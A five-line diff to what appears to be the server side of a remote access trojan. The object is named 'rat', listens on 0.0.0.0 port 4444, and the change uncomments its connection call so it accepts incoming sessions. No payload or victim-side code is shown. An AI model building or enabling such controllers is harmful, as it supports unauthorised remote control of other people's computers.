@@ -126,5 +126,5 @@ rat = SERVER('0.0.0.0', 4444)
 
 
 if __name__ == '__main__':
-    # rat.connection()
+    rat.connection()
     rat.mainloop()
